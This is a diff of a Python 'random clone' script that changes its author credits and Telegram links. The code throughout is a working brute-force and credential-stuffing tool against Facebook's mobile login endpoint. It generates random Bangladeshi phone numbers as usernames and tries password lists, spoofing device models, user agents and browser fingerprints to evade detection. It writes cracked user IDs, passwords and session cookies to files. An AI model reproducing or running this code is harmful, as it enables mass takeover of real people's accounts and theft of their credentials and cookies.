@@ -1,6 +1,6 @@
-# RANDOM SCRIPT MOSSBBIR
+# RANDOM SCRIPT GIFT BY MR POCO
 # UPDATE KORE NIBEN
-# JOIN TELEGRAM GROUP : https://t.me/mosabbirhossainsajib
+# JOIN TELEGRAM GROUP : https://t.me/MR_POCO_143
 #------------------[ IMPORT ]------------------#
 import os,sys,re,random,time,string,requests
 from concurrent.futures import ThreadPoolExecutor as habib
@@ -24,18 +24,18 @@ for pocoxd in range(5000):
 #------------------[ LOGO ]------------------#
 logo = f"""
 {white}-----------------------------------------------
- {white}[{green}√{white}] CODE BY MOSABBIR-PRO
- {white}[{green}√{white}] RANDOM 
+ {white}[{green}√{white}] CODE BY MR-POCO 
+ {white}[{green}√{white}] RANDOM SCRIPT GIFT
 {white}-----------------------------------------------"""
 #------------------[ MAIN MENU ]------------------#
 def poco():
-	clear();os.system('xdg-open https://t.me/MOSABBIR-PRO_143');print(f' {white}[{green}1{white}] START RANDOM CLONE ');print(f' {white}[{green}2{white}] EXIT CLONE ');linex();bal=input(f' {white}[{green}?{white}] SELECT : ')
+	clear();os.system('xdg-open https://t.me/MR_POCO_143');print(f' {white}[{green}1{white}] START RANDOM CLONE ');print(f' {white}[{green}2{white}] EXIT CLONE ');linex();bal=input(f' {white}[{green}?{white}] SELECT : ')
 	if bal in ['1']:___Bangladesh___()
 	else:print(f' {white}[{green}√{white}] OPTION NOT FOUND BROH');exit()
 #------------------[ RANDOM MENU ]------------------#
 def ___Bangladesh___():
-	clear();os.system('xdg-open https://t.me/MOSABBIR-PRO_143');print(f' {white}[{green}√{white}] CODE : 017 | 018 | 013 | 016 | 019 ');linex();code=input(f' {white}[{green}?{white}] SELECT : ')
-	clear();os.system('xdg-open https://t.me/MOSABBIR-PRO_143');print(f' {white}[{green}√{white}] LIMIT : 2222 | 3333 | 4444 | 5555 | 9999 ');linex();limit=input(f' {white}[{green}?{white}] SELECT : ')
+	clear();os.system('xdg-open https://t.me/MR_POCO_143');print(f' {white}[{green}√{white}] CODE : 017 | 018 | 013 | 016 | 019 ');linex();code=input(f' {white}[{green}?{white}] SELECT : ')
+	clear();os.system('xdg-open https://t.me/MR_POCO_143');print(f' {white}[{green}√{white}] LIMIT : 2222 | 3333 | 4444 | 5555 | 9999 ');linex();limit=input(f' {white}[{green}?{white}] SELECT : ')
 	for xxx in range(int(limit)):
 		mrpoco = "".join(random.choice(string.digits) for _ in range(8))
 		user.append(mrpoco)
@@ -67,16 +67,16 @@ def values(url=None):
 #------------------[ RANDOM METHOD HOST ]------------------#
 def _P_O_C_O_(ids,passlist):
     global loop,oks,cps
-    sys.stdout.write(f"\r\r {white}[{green}MOSABBIR-PRO{white}]-[{loop}|{len(oks)}|{len(cps)}] ");sys.stdout.flush()
+    sys.stdout.write(f"\r\r {white}[{green}MR-POCO{white}]-[{loop}|{len(oks)}|{len(cps)}] ");sys.stdout.flush()
     ewe = requests.Session()
     ____pokki____=random.choice(ugen)
     try:
         for pas in passlist:
-            MOSABBIR-PRO = values("https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100")
+            mr_poco = values("https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100")
             modelx = random.choice(["SM-J320F", "SM-N975F", "SM-S918B", "SM-N986U", "SM-S908U", "SM-G991B", "SM-A528B", "SM-A536B", "SM-A146U", "SM-A037U", "SM-N975F", "SM-N960F", "SM-G960U", "SM-A202F", "SM-G965U", "YA-L29", "SM-A115U", "SM-S918B", "SM-F711B", "SM-A336B", "SM-G975U", "SM-N9860", "SM-N9860", "SM-G996U", "SM-G998U", "SM-A750GN", "SM-N770F", "SM-G900F", "SM-Z130H", "SM-G900F", "SM-G900F", "SM-T800", "SM-N900V", "SAMSUNG GT-I9515", "SM-T530NU", "SM-T530", "SM-Z130H", "SM-Z130H", "SM-G360T1", "SM-A800F", "SM-T530", "SM-G928F", "SM-G925F", "SM-T817T", "SM-T355Y", "SM-J200G", "SM-N915F", "SM-P901", "SM-G531H", "SM-J701M", "SM-J111F", "SM-J105Y", "SM-J120F", "SM-T550", "SM-Z200Y", "SM-J500FN", "SM-A800F", "SM-T280", "SM-J120H", "SM-A310F", "SM-T530", "SM-T331", "SM-A510F", "SM-S920L", "SM-G925F", "SM-T670", "SM-T670", "SM-G925F", "SM-Z200F", "SM-T585", "SM-T285", "SM-N976V", "SM-G977N", "SM-G975F", "SM-G970F", "SM-F900U", "SM-A805F", "SM-A505F", "SM-G350E", "SM-G350", "SM-G350E", "SM-J326AZ", "SM-J336AZ", "GT-P3100", "SM-A202F", "SM-A260F", "SM-A145R", "SM-A136B", "SM-A546B", "SM-A736B", "SM-A530F", "SM-G885F", "SM-A805F", "SM-A910F", "SM-G8850", "SM-G316MY", "SM-G318H", "SM-G850F", "SM-G386T", "GT-I5801", "SM-C7010", "SM-C9000", "EK-GC100", "SM-G355H", "SM-G350E", "SM-G360H", "SM-G361H", "SM-G361HU", "SM-G360BT", "SM-G360T", "SM-G360BT", "SM-G361H", "SM-G361", "GT-I8730", "SM-G1650", "SM-G1650", "SM-R810", "SM-R905U", "SM-R905N", "SM-J200BT", "SM-J200G", "SM-J337R4", "SM-J337U", "SM-J337W", "SM-J337A", "SM-J337R", "SM-S327VL", "SM-J330F", "SM-J327T1", "SM-N975U", "SM-A205F"])
             data = {
-				"m_ts": MOSABBIR-PRO.get('m_ts'),
-				"li": MOSABBIR-PRO.get('li'),
+				"m_ts": mr_poco.get('m_ts'),
+				"li": mr_poco.get('li'),
 				"try_number": 0,
 				"unrecognized_tries": 0,
 				"email": ids,
@@ -91,8 +91,8 @@ def _P_O_C_O_(ids,passlist):
 				"bi_xrwh": 0,
 				"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),
 				"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
-				"jazoest": MOSABBIR-PRO.get('jazoest'),
-				"lsd": MOSABBIR-PRO.get('lsd'),}
+				"jazoest": mr_poco.get('jazoest'),
+				"lsd": mr_poco.get('lsd'),}
             headers = {
                  'user-agent': ____pokki____,
                  'Host': 'p.facebook.com', 
@@ -126,14 +126,14 @@ def _P_O_C_O_(ids,passlist):
                 if "Photoshop" in response:
                 	print(f'\r\r {white}[{green}POCO-OK{white}]{green} '+uid+' | '+pas+'\033[1;97m')
                 	#print(f'\r\r {white}[{green}COOKIES{white}]{white} '+cookies);linex()
-                	open("/sdcard/MOSABBIR-PRO-RANDOM-OK.txt","a").write(uid+"|"+pas+"|"+cookies+"\n")
+                	open("/sdcard/MR-POCO-RANDOM-OK.txt","a").write(uid+"|"+pas+"|"+cookies+"\n")
                 	oks.append(ids)
                 	break
                 else:continue
             elif 'checkpoint' in response.cookies.get_dict():
             	uid = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
             	#print(f'\r\r {white}[{rad}POCO-CP{white}]{rad} '+uid+' | '+pas+'\033[1;97m')
-            	open('/sdcard/MOSABBIR-PRO-RANDOM-CP','a').write(uid+'|'+pas+'\n')
+            	open('/sdcard/MR-POCO-RANDOM-CP','a').write(uid+'|'+pas+'\n')
             	cps.append(ids)
             	break
             else:continue
